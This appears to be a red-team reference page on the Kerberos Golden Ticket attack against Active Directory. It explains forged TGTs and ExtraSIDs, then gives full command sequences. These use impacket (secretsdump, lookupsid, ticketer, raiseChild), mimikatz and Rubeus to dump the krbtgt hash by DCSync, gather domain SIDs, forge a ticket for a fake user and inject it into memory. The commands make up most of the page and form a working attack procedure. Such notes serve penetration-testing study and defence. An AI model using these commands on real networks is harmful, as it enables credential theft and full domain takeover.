---
icon: ticket-simple
---

# Golden Ticket

## <mark style="color:$primary;">ABOUT</mark>

<mark style="color:red;">**Golden Ticket**</mark> is a <mark style="color:purple;">**forged Kerberos TGT**</mark> that an attacker can create after obtaining the <mark style="color:green;">**KRBTGT**</mark> account hash from Active Directory, <mark style="color:yellow;">**allowing them to impersonate any user, including domain administrators**</mark>, and gain unrestricted access to services across the domain without the need for Active Directory to validate the user’s existence or group membership. The ticket contains a <mark style="color:green;">**Privilege Attribute Certificate (PAC)**</mark> that defines the user’s identity and privileges, which Windows trusts without cross-checking with the domain controller.&#x20;

<mark style="color:red;">**ExtraSIDs**</mark> [**\[LINK\]**](https://venator17.gitbook.io/bibliotheque/active-directory/movement/trust-abuse/extrasids) can be included in the PAC to simulate inherited privileges, such as previous group memberships, enabling privilege escalation even for accounts that no longer have those roles.

### <mark style="color:yellow;">Requirements</mark>

1. <mark style="color:orange;">**KRBTGT hash**</mark> for the child domain _(In example we are doing DCSync because for forging we need to have child domain fully compromised)_
2. <mark style="color:orange;">**SID**</mark> for the child domain
3. <mark style="color:orange;">**Name of a Target User**</mark> in the child domain _(does not need to exist! We can make a fake name, like `"hacker"`)_
4. <mark style="color:orange;">**FQDN**</mark> of the child domain

## <mark style="color:$primary;">LINUX</mark>

### <mark style="color:yellow;">Preparing</mark>

#### **1. Obtaining the KRBTGT Account's NT Hash**

```shell-session
impacket-secretsdump fia.militech.local/sreed@13.13.13.13 -just-dc-user FIA/krbtgt
```

#### 2. Bruteforce SID's in Domain

> First it enumerates Domain SID via **LSARPC**, then bruteforces last **(RID)** part

> With same way you can grep groups you're interested in, or find common SID's in this site [**\[LINK\]**](https://adsecurity.org/?p=1001)

```powershell
impacket-lookupsid fia.militech.local/sreed@13.13.13.13 | grep "Domain SID"
```

### <mark style="color:yellow;">Forging</mark>

```bash
impacket-ticketer -nthash ffffffffffffffffffff -domain FIA.INLANEFREIGHT.LOCAL -domain-sid S-1-22-3334444-55555-666666 -extra-sid /sids:S-1-22-3334444-55555-666666-7331 hacker
```

#### Add Ticket to Memory

```bash
export KRB5CCNAME=hacker.ccache 
```

### <mark style="color:yellow;">All-In-One</mark>

**Impacket** also has the tool <mark style="color:green;">**`raiseChild`**</mark>, which will automate escalating from child to parent domain. We need to specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest.

```bash
impacket-raiseChild -target-exec 13.13.13.13 FIA.MILITECH.LOCAL/sreed
```

## <mark style="color:$primary;">WINDOWS</mark>

### <mark style="color:yellow;">Preparing</mark>

#### **1. Obtaining the KRBTGT Account's NT Hash**

```shell-session
mimikatz # lsadump::dcsync /user:FIA\krbtgt
```

#### 2. Get SID of Child Domain

<mark style="color:green;">**`PowerView`**</mark>

```powershell
PS C:\> Get-DomainSID
```

### <mark style="color:yellow;">Forging</mark>

> Option <mark style="color:green;">**`/sids`**</mark> is for **ExtraSIDs** attack, explained here [**\[LINK\]**](https://venator17.gitbook.io/bibliotheque/active-directory/movement/trust-abuse/extrasids)

#### <mark style="color:green;">`Mimikatz`</mark>

```shell-session
mimikatz # kerberos::golden /user:hacker /domain:FIA.MILITECH.LOCAL /sid:S-1-22-3334444-55555-666666 /krbtgt:ffffffffffffffffffff /sids:S-1-22-3334444-55555-666666-7331 /ptt
```

#### <mark style="color:green;">`Rubeus`</mark>

```powershell
PS C:\> .\Rubeus.exe golden /rc4:ffffffffffffffffffff /domain:FIA.MILITECH.LOCAL /sid:S-1-22-3334444-55555-666666  /sids:S-1-22-3334444-55555-666666-7331 /user:hacker /ptt
```

#### Check Ticket in Memory

```powershell
PS C:\> klist
```

## <mark style="color:$primary;">RESOURCES</mark>

{% embed url="https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/" %}

{% embed url="https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden" %}

{% embed url="https://adsecurity.org/?p=1001" %}
Common SID's
{% endembed %}

{% embed url="https://venator17.gitbook.io/bibliotheque/active-directory/movement/trust-abuse/extrasids" %}
